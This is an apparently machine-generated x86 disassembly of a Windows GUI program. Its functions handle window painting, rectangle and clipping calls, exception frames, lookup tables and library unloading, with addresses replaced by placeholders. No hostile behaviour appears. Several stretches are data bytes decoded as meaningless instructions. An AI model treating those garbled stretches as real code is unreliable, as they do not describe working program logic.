mov edx [ ebx + 0x68 ]
mov eax esi
call sub_41d9fc
mov edx r-xdata
mov eax esi
call sub_41d958
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_427574
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4361dc
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_4275cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_438e04
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_4276ed
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_438e04
call sub_403910
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_433150
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_43312c
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_427708
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43acb8
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_427734
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_43b358
pop esi
pop ebx
retn
sub_427770
xchg [ fs : esi ] al
cmp al 0xff
add [ eax ] al
xchg [ fs : esi ] al
cmp eax 0x640000ff
xchg [ esi ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] bh
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx ] ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] ah
add [ eax ] al
xchg [ fs : esi ] al
and eax 0x640000ff
xchg [ esi ] al
inc [ es : eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] ah
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
xchg [ fs : esi ] al
sub eax 0x640000ff
xchg [ esi ] al
inc [ cs : eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
xchg [ fs : esi ] al
adc eax 0x640000ff
xchg [ esi ] al
push ss
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
xchg [ fs : esi ] al
sbb eax 0x640000ff
xchg [ esi ] al
push ds
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
xchg [ fs : esi ] al
add eax 0x640000ff
xchg [ esi ] al
push es
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edx ] cl
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ eax + 0x69 ] dl
inc esi
add al ah
js r-xdata
imul eax [ esi ] r-xdata
add [ ecx + 0x46 ] ch
add [ eax - 0x7ffbd88 ] dl
add [ eax + 0x69 ] cl
inc esi
add al bl
js r-xdata
push 0x78000046
inc edx
add [ eax + 0x40004668 ] dh
js r-xdata
push 0x78880046
inc edx
add al dh
push 0x78800046
inc edx
add al ch
imul eax [ esi ] r-xdata
clc
add [ eax + 0x69 ] al
inc esi
add al dl
js r-xdata
push 0x77b00046
inc edx
add [ eax ] bl
add [ eax + 0x68 ] ah
inc esi
add al dh
ja r-xdata
push 0x77f80046
inc edx
add [ eax + 0x38004668 ] ch
js r-xdata
add [ eax ] bh
imul eax [ esi ] r-xdata
xor [ ecx + 0x46 ] ch
add al al
js r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427aa7
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404928
push 0x77a80046
inc edx
add [ eax ] dl
add [ eax + 0x68 ] bl
inc esi
add al ch
ja r-xdata
push 0x77f00046
inc edx
add [ eax + 0x30004668 ] ah
js r-xdata
push 0x78780046
inc edx
add al ah
push 0x78700046
inc edx
add al bl
push 0x78680046
inc edx
add al dl
push 0x78600046
inc edx
add al cl
push 0x78580046
inc edx
add al al
push 0x78500046
inc edx
add [ eax + 0x48004668 ] bh
js r-xdata
add [ eax ] ch
imul eax [ esi ] r-xdata
and [ ecx + 0x46 ] ch
add [ eax + 0x18004278 ] dh
imul eax [ esi ] r-xdata
adc [ ecx + 0x46 ] ch
add [ eax + 0x8004278 ] ah
push 0x77a00046
inc edx
add [ eax ] cl
add [ eax + 0x68 ] dl
inc esi
add al ah
ja r-xdata
push 0x77e80046
inc edx
add [ eax + 0x28004668 ] bl
js r-xdata
push 0x77980046
inc edx
add [ eax ] al
add [ eax + 0x68 ] cl
inc esi
add al bl
ja r-xdata
push 0x77e00046
inc edx
add [ eax + 0x20004668 ] dl
js r-xdata
push 0x77900046
inc edx
add al bh
add [ eax + 0x68 ] al
inc esi
add al dl
ja r-xdata
push 0x77d80046
inc edx
add [ eax + 0x18004668 ] cl
js r-xdata
inc esi
add [ eax - 0xfffbd89 ] cl
inc esi
add [ eax - 0x17ffbd89 ] al
inc esi
add [ eax + 0x77 ] bh
inc edx
add al ah
inc esi
add [ eax + 0x77 ] dh
inc edx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_427aa0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add [ eax ] bh
push 0x77d00046
inc edx
add [ eax + 0x10004668 ] al
js r-xdata
push 0x77c80046
inc edx
add [ eax ] dh
add [ eax + 0x68 ] bh
inc esi
add [ eax ] cl
js r-xdata
push 0x77c00046
inc edx
add [ eax ] ch
add [ eax + 0x68 ] dh
inc esi
add [ eax ] al
js r-xdata
push 0x77b80046
inc edx
add [ eax ] ah
add [ eax + 0x68 ] ch
inc esi
add al bh
ja r-xdata
sub_427adc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427b01
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427b08
retn
sub_427b14
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427b45
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427b4c
retn
mov eax [ rw-data ]
call sub_4030f0
sub_427bfc
or al [ eax ]
add [ eax ] al
jl r-xdata
add [ eax + 0x69 ] bl
inc esi
add ah cl
jne r-xdata
inc esi
add [ eax + edi * 2 ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x69 ] bh
inc esi
add [ eax ] ch
jbe r-xdata
mov eax sub_427bfc
call sub_403bfc
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402b04
retn
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x46 ] dh
add [ ebp + esi * 2 + 0x46 ] bl
add [ eax ] al
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427cab
retn
call sub_427be0
inc edx
add bl al
jmp sub_40382c
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x46 ] bl
add [ eax + 0x7b ] dl
inc esi
add [ eax ] al
add [ eax ] al
jne r-xdata
inc esi
add [ edi + esi * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 2 + 0x46 ] ch
add [ eax + edi * 2 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x69 ] ch
inc esi
add [ eax + 0x467b ] dl
add [ eax ] al
add [ ecx + ebp * 2 + 0x46 ] ah
add [ eax + 0x4678 ] ch
add [ eax ] al
add [ eax + 0x69 ] ah
inc esi
add [ eax + 0x79 ] bh
inc esi
sub_427cd8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427cfd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427d04
retn
sub_427d1f
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_427d64
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427d6b
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404928
sub_427d87
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_427dcc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427dd3
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404928
sub_427de3
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427e39
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427e40
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403eac
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_427e4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427e90
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427e97
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_427ea4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_427ec9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427ed0
retn
sub_427edc
sub [ edi + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jg r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
add [ eax + eax ] al
add [ eax ] al
mov al [ 0x20004010 ]
xor eax [ eax ]
sub al 0x33
inc eax
add [ eax ] dh
xor eax [ eax ]
xor al 0x33
inc eax
add [ eax ] ch
xor eax [ eax ]
mov [ eax ] dh
inc eax
add [ eax + esi + 0x30e00040 ] ah
inc eax
add [ edi + edi * 2 + 0x7fc80042 ] dh
inc edx
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
insb
jb r-xdata
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
nop
push sub_42804b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428052
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048dc
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_427fdc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42804b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428052
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048dc
mov eax rw-data
mov edx [ r-xdata ]
call sub_4048dc
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4282a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_424774
mov [ esi + 0x5 ] al
call sub_427f7c
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_428ae8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax esi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_4282f0
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax esi
call sub_428390
call sub_4245b4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_428324
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_428390
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_4283d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_428324
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_428420
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_428324
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_428464
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_428324
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_4284cc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_4046f8
push eax
mov eax esi
call sub_4046e8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_428324
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_428530
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4285b4
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4285f0
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_42860d ]
jmp [ eax * 4 + jump_table_428676 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_42897c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_428ad7
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_4285b4
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_428420
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_43a170
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_41242c
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
